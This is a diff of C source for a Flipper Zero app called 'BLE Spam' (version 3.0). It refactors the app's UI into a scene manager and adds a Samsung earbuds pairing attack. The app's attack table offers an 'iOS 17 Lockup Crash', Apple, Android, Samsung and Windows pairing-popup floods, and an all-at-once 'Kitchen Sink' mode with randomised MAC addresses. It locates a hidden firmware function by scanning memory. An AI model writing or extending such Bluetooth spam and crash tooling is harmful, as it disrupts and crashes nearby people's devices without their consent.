@@ -1,10 +1,11 @@
+#include "ble_spam.h"
 #include <gui/gui.h>
 #include <gui/elements.h>
 #include <furi_hal_bt.h>
 #include <stdint.h>
 #include <furi_hal_random.h>
 #include "ble_spam_icons.h"
-#include "protocols/_registry.h"
+#include "protocols/_protocols.h"
 
 // NAPI
 // TODO: Use __attribute__((aligned(2))) instead?
@@ -58,7 +59,7 @@ uintptr_t* scan_memory_for_sequence(uint32_t sequence) {
             return (uintptr_t*)(addr - SEQUENCE_OFFSET);
         }
     }
-    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to 0.90.1 OFW offset
+    return (uintptr_t*)HCI_SEND_REQ_ADDR; // If not found, default to latest OFW offset
 }
 
 int (*napi_hci_send_req)(struct hci_request* p_cmd, uint8_t async) = NULL;
@@ -187,41 +188,29 @@ bool napi_furi_hal_bt_custom_adv_stop() {
 // Hacked together by @Willy-JL
 // Custom adv API by @Willy-JL (idea by @xMasterX)
 // iOS 17 Crash by @ECTO-1A
-// Android and Windows Pairs by @Spooks4576 and @ECTO-1A
+// Android, Samsung and Windows Pairs by @Spooks4576 and @ECTO-1A
 // Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
 // Controversy explained at https://willyjl.dev/blog/the-controversy-behind-apple-ble-spam
-
-typedef struct {
-    bool random_mac;
-    const BleSpamProtocol* protocol;
-    BleSpamMsg msg;
-} Payload;
-
-typedef struct {
-    const char* title;
-    const char* text;
-    Payload payload;
-} Attack;
 
 static Attack attacks[] = {
     {
         .title = "+ Kitchen Sink",
         .text = "Flood all attacks at once",
+        .protocol = NULL,
         .payload =
             {
                 .random_mac = true,
-                .protocol = NULL,
-                .msg = {},
+                .cfg = {},
             },
     },
     {
         .title = "iOS 17 Lockup Crash",
         .text = "Newer iPhones, long range",
+        .protocol = &protocol_continuity,
         .payload =
             {
                 .random_mac = false,
-                .protocol = &ble_spam_protocol_continuity,
-                .msg =
+                .cfg =
                     {
                         .continuity =
                             {
@@ -234,11 +223,11 @@ static Attack attacks[] = {
     {
         .title = "Apple Action Modal",
         .text = "Lock cooldown, long range",
+        .protocol = &protocol_continuity,
         .payload =
             {
                 .random_mac = false,
-                .protocol = &ble_spam_protocol_continuity,
-                .msg =
+                .cfg =
                     {
                         .continuity =
                             {
@@ -251,11 +240,11 @@ static Attack attacks[] = {
     {
         .title = "Apple Device Popup",
         .text = "No cooldown, close range",
+        .protocol = &protocol_continuity,
         .payload =
             {
                 .random_mac = false,
-                .protocol = &ble_spam_protocol_continuity,
-                .msg =
+                .cfg =
                     {
                         .continuity =
                             {
@@ -267,25 +256,38 @@ static Attack attacks[] = {
     },
     {
         .title = "Android Device Pair",
-        .text = "~15min cooldown, long range",
+        .text = "Reboot cooldown, long range",
+        .protocol = &protocol_fastpair,
         .payload =
             {
                 .random_mac = true,
-                .protocol = &ble_spam_protocol_fastpair,
-                .msg =
+                .cfg =
                     {
                         .fastpair = {},
                     },
             },
     },
     {
-        .title = "Windows Device Found",
-        .text = "Requires enabling SwiftPair",
+        .title = "Samsung Earbuds Pair",
+        .text = "No cooldown, long range",
+        .protocol = &protocol_smartthings,
         .payload =
             {
                 .random_mac = true,
-                .protocol = &ble_spam_protocol_swiftpair,
-                .msg =
+                .cfg =
+                    {
+                        .smartthings = {},
+                    },
+            },
+    },
+    {
+        .title = "Windows Device Found",
+        .text = "Requires enabling SwiftPair",
+        .protocol = &protocol_swiftpair,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg =
                     {
                         .swiftpair = {},
                     },
@@ -293,11 +295,12 @@ static Attack attacks[] = {
     },
 };
 
-#define ATTACK_COUNT ((signed)COUNT_OF(attacks))
+#define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
 
-uint16_t delays[] = {20, 50, 100, 200};
+static uint16_t delays[] = {20, 50, 100, 200};
 
 typedef struct {
+    Ctx ctx;
     bool resume;
     bool advertising;
     uint8_t delay;
@@ -305,21 +308,21 @@ typedef struct {
     int8_t index;
 } State;
 
-static int32_t adv_thread(void* ctx) {
-    State* state = ctx;
+static int32_t adv_thread(void* _ctx) {
+    State* state = _ctx;
     uint8_t size;
     uint16_t delay;
     uint8_t* packet;
     uint8_t mac[GAP_MAC_ADDR_SIZE];
     Payload* payload = &attacks[state->index].payload;
+    const Protocol* protocol = attacks[state->index].protocol;
     if(!payload->random_mac) furi_hal_random_fill_buf(mac, sizeof(mac));
 
     while(state->advertising) {
-        if(payload->protocol) {
-            payload->protocol->make_packet(&size, &packet, &payload->msg);
+        if(protocol) {
+            protocol->make_packet(&size, &packet, &payload->cfg);
         } else {
-            ble_spam_protocols[rand() % ble_spam_protocols_count]->make_packet(
-                &size, &packet, NULL);
+            protocols[rand() % protocols_count]->make_packet(&size, &packet, NULL);
         }
         napi_furi_hal_bt_custom_adv_set(packet, size);
         free(packet);
@@ -349,20 +352,24 @@ static void toggle_adv(State* state) {
 }
 
 #define PAGE_MIN (-3)
-#define PAGE_MAX ATTACK_COUNT
+#define PAGE_MAX ATTACKS_COUNT
 enum {
     PageHelpApps = PAGE_MIN,
     PageHelpDelay,
     PageHelpDistance,
     PageStart = 0,
-    PageEnd = ATTACK_COUNT - 1,
+    PageEnd = ATTACKS_COUNT - 1,
     PageAboutCredits = PAGE_MAX,
 };
 
-static void draw_callback(Canvas* canvas, void* ctx) {
-    State* state = ctx;
+static void draw_callback(Canvas* canvas, void* _ctx) {
+    State* state = *(State**)_ctx;
     const char* back = "Back";
     const char* next = "Next";
+    if(state->index < 0) {
+        back = "Next";
+        next = "Back";
+    }
     switch(state->index) {
     case PageStart - 1:
         next = "Spam";
@@ -379,12 +386,12 @@ static void draw_callback(Canvas* canvas, void* ctx) {
     }
 
     const Attack* attack =
-        (state->index >= 0 && state->index <= ATTACK_COUNT - 1) ? &attacks[state->index] : NULL;
-    const Payload* payload = &attack->payload;
-    const BleSpamProtocol* protocol = (attack && payload->protocol) ? payload->protocol : NULL;
+        (state->index >= 0 && state->index <= ATTACKS_COUNT - 1) ? &attacks[state->index] : NULL;
+    const Payload* payload = attack ? &attack->payload : NULL;
+    const Protocol* protocol = attack ? attack->protocol : NULL;
 
     canvas_set_font(canvas, FontSecondary);
-    canvas_draw_icon(canvas, 4, 3, protocol ? protocol->icon : &I_ble);
+    canvas_draw_icon(canvas, 4 - !protocol, 3, protocol ? protocol->icon : &I_ble_spam);
     canvas_draw_str(canvas, 14, 12, "BLE Spam");
 
     switch(state->index) {
@@ -450,7 +457,7 @@ static void draw_callback(Canvas* canvas, void* ctx) {
             "App+Spam: \e#WillyJL\e# XFW\n"
             "Apple+Crash: \e#ECTO-1A\e#\n"
             "Android+Win: \e#Spooks4576\e#\n"
-            "                                   Version \e#2.0\e#",
+            "                                   Version \e#3.0\e#",
             false);
         break;
     default: {
@@ -469,9 +476,9 @@ static void draw_callback(Canvas* canvas, void* ctx) {
             sizeof(str),
             "%02i/%02i: %s",
             state->index + 1,
-            ATTACK_COUNT,
-            protocol ? protocol->get_name(&payload->msg) : "Everything");
-        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 24, str);
+            ATTACKS_COUNT,
+            protocol ? protocol->get_name(&payload->cfg) : "Everything");
+        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 21, str);
 
         canvas_set_font(canvas, FontPrimary);
         canvas_draw_str(canvas, 4, 34, attack->title);
@@ -492,41 +499,30 @@ static void draw_callback(Canvas* canvas, void* ctx) {
     }
 }
 
-static void input_callback(InputEvent* input, void* ctx) {
-    FuriMessageQueue* input_queue = ctx;
+static bool input_callback(InputEvent* input, void* _ctx) {
+    View* view = _ctx;
+    State* state = *(State**)view_get_model(view);
+    bool consumed = false;
+
     if(input->type == InputTypeShort || input->type == InputTypeLong ||
        input->type == InputTypeRepeat) {
-        furi_message_queue_put(input_queue, input, 0);
-    }
-}
+        consumed = true;
 
-int32_t ble_spam(void* p) {
-    UNUSED(p);
-    State* state = malloc(sizeof(State));
-    state->thread = furi_thread_alloc();
-    furi_thread_set_callback(state->thread, adv_thread);
-    furi_thread_set_context(state->thread, state);
-    furi_thread_set_stack_size(state->thread, 4096);
-
-    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
-    ViewPort* view_port = view_port_alloc();
-    Gui* gui = furi_record_open(RECORD_GUI);
-    view_port_input_callback_set(view_port, input_callback, input_queue);
-    view_port_draw_callback_set(view_port, draw_callback, state);
-    gui_add_view_port(gui, view_port, GuiLayerFullscreen);
-
-    bool running = true;
-    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
-        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);
-    while(running) {
-        InputEvent input;
-        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);
-
-        bool is_attack = state->index >= 0 && state->index <= ATTACK_COUNT - 1;
+        bool is_attack = state->index >= 0 && state->index <= ATTACKS_COUNT - 1;
         bool advertising = state->advertising;
-        switch(input.key) {
+
+        switch(input->key) {
         case InputKeyOk:
-            if(is_attack) toggle_adv(state);
+            if(is_attack) {
+                if(input->type == InputTypeLong) {
+                    if(advertising) toggle_adv(state);
+                    state->ctx.attack = &attacks[state->index];
+                    scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
+                    scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
+                } else if(input->type == InputTypeShort) {
+                    toggle_adv(state);
+                }
+            }
             break;
         case InputKeyUp:
             if(is_attack && state->delay < COUNT_OF(delays) - 1) {
@@ -552,19 +548,88 @@ int32_t ble_spam(void* p) {
             break;
         case InputKeyBack:
             if(advertising) toggle_adv(state);
-            running = false;
+            consumed = false;
             break;
         default:
-            continue;
+            break;
         }
-
-        view_port_update(view_port);
     }
 
-    gui_remove_view_port(gui, view_port);
+    view_commit_model(view, consumed);
+    return consumed;
+}
+
+static bool back_event_callback(void* _ctx) {
+    Ctx* ctx = _ctx;
+    return scene_manager_handle_back_event(ctx->scene_manager);
+}
+
+int32_t ble_spam(void* p) {
+    UNUSED(p);
+    napi_hci_send_req = (int (*)(struct hci_request*, uint8_t))(
+        (uintptr_t)(scan_memory_for_sequence(TARGET_SEQUENCE)) | 0x01);
+    State* state = malloc(sizeof(State));
+    state->thread = furi_thread_alloc();
+    furi_thread_set_callback(state->thread, adv_thread);
+    furi_thread_set_context(state->thread, state);
+    furi_thread_set_stack_size(state->thread, 4096);
+
+    Gui* gui = furi_record_open(RECORD_GUI);
+    state->ctx.view_dispatcher = view_dispatcher_alloc();
+    view_dispatcher_enable_queue(state->ctx.view_dispatcher);
+    view_dispatcher_set_event_callback_context(state->ctx.view_dispatcher, &state->ctx);
+    view_dispatcher_set_navigation_event_callback(state->ctx.view_dispatcher, back_event_callback);
+    state->ctx.scene_manager = scene_manager_alloc(&scene_handlers, &state->ctx);
+
+    View* view_main = view_alloc();
+    view_allocate_model(view_main, ViewModelTypeLockFree, sizeof(State*));
+    with_view_model(
+        view_main, State * *model, { *model = state; }, false);
+    view_set_context(view_main, view_main);
+    view_set_draw_callback(view_main, draw_callback);
+    view_set_input_callback(view_main, input_callback);
+    view_dispatcher_add_view(state->ctx.view_dispatcher, ViewMain, view_main);
+
+    state->ctx.byte_input = byte_input_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher, ViewByteInput, byte_input_get_view(state->ctx.byte_input));
+
+    state->ctx.submenu = submenu_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher, ViewSubmenu, submenu_get_view(state->ctx.submenu));
+
+    state->ctx.text_input = text_input_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher, ViewTextInput, text_input_get_view(state->ctx.text_input));
+
+    state->ctx.variable_item_list = variable_item_list_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher,
+        ViewVariableItemList,
+        variable_item_list_get_view(state->ctx.variable_item_list));
+
+    view_dispatcher_attach_to_gui(state->ctx.view_dispatcher, gui, ViewDispatcherTypeFullscreen);
+    scene_manager_next_scene(state->ctx.scene_manager, SceneMain);
+    view_dispatcher_run(state->ctx.view_dispatcher);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewByteInput);
+    byte_input_free(state->ctx.byte_input);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewSubmenu);
+    submenu_free(state->ctx.submenu);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewTextInput);
+    text_input_free(state->ctx.text_input);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewVariableItemList);
+    variable_item_list_free(state->ctx.variable_item_list);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewMain);
+    view_free(view_main);
+
+    scene_manager_free(state->ctx.scene_manager);
+    view_dispatcher_free(state->ctx.view_dispatcher);
     furi_record_close(RECORD_GUI);
-    view_port_free(view_port);
-    furi_message_queue_free(input_queue);
 
     furi_thread_free(state->thread);
     free(state);
